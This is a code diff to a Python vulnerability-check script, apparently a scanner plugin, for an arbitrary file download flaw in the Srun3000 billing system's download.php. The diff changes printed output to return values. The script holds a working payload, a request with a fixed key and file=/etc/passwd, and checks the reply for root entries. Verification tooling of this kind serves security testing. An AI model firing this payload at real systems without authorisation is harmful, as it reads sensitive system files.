@@ -8,8 +8,6 @@ description: srun3000 8081端口文件download.php中,k为md5(file+"ijfri&8%4")�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
 
 class srun_download_file_filedownload_BaseVerify:
     def __init__(self, url):
@@ -24,16 +22,16 @@ class srun_download_file_filedownload_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"hostname" in req.text and r"clientver" in req.text:
-                cprint("[+]存在深澜软件srun3000计费系统download.php任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在深澜软件srun3000计费系统download.php任意文件下载漏洞...(高危)\tpayload: "+vulnurl
             vulnurl = self.url + "/download.php?k=5a965488ed38055590daf62ddd52dbb3&file=/etc/passwd"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"root:" in req.text and r"/bin/bash" in req.text:
-                cprint("[+]存在深澜软件srun3000计费系统download.php任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
-
+                return "[+]存在深澜软件srun3000计费系统download.php任意文件下载漏洞...(高危)\tpayload: "+vulnurl
+            else:
+                return "[-]no vuln"
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ====>连接超时"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = srun_download_file_filedownload_BaseVerify(sys.argv[1])
     testVuln.run()
